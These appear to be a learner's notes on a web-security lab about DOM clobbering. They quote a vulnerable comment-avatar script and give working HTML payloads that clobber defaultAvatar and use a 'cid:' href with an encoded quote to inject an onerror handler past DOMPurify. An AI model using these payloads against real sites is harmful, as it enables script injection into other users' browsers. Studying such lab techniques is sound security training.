Goal:
construct an HTML injection that clobbers a variable and uses XSS to call the alert() function.     



analysis:
    hint:comment functionality
    try to loadComments...js => look through
    function displayCOmments can be vulnerable


    <script>
        let defaultAvatar = window.defaultAvatar || {avatar: '/resources/images/avatarDefault.svg'}
        let avatarImgHTML = '<img class="avatar" src="' + (comment.avatar ? escapeHTML(comment.avatar) : defaultAvatar.avatar) + '">';
    </script>

    defaultAvtar, avatarImgHTML
    the defaultAvatar object is implemented using this dangerous pattern containing the logical OR operator in conjunction with a global variable. This makes it vulnerable to DOM clobbering. 
    avatarIMGHTML store src 0f img, we can use this to add js payload to src
    comment.avatar will take escapeHTML or defaultAvatar.avatar

    dompurify => we can use "cid:" to bypass encode double-quotes

Idea:
    try to load comment.avatar = false => it will take defaultAvatar.avatar
    => we can change defaultAvatar and name=avatar with a tag
    => add payload to src => store in avatarImgHTML
    
payload:
    <a id="defaultAvatar"><a id="defaultAvatar" name="avatar" href="cid:&quot;onerror=alert(1)//"></a>
    
    <a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//"></a>
explain: use 2 a tag to modify id, avatar
user: &quot; so when decode it close the tag href => when href error => alert(1)